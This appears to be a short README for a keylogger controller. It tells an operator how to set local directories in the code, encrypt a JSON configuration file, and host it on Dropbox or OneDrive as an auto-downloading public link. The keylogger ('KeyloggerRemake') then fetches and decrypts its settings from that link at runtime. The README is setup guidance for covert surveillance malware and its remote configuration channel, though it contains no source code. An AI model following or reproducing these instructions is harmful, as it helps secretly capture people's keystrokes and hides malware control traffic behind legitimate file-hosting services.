# KeyloggerController

The controller for the keylogger, please ensure that the encrypted file is also the public link for the keylogger to grab and decrypt.

Things to do after downloading:
1. Edit its local json file as well as where to encrypt it to
   - In classJsonObj: Change `strJsonDir = @"ADDYOURDIRECTORYHERE"` to a directory with the Json file.
   - In classJsonObj: Change `strEncryptDir = @"ADDYOURDIRECTORYHERE"` to a directory to save that Json file, encrypted.
2. Upload the encrypted json file onto a file hosting service like Dropbox or OneDrive, and get its public link (Make sure it's an auto-downloadable link)
3. Change KeyloggerRemake's encrypted key to the public link of the specified encrypted directory in the Controller
   - In classGetEncryption: Change `strEncryptedFile = "ADDYOURURLHERE` to the public URL of that encrypted Json file (Must auto download!).
4. Change settings in KeyloggerController upon runtime.
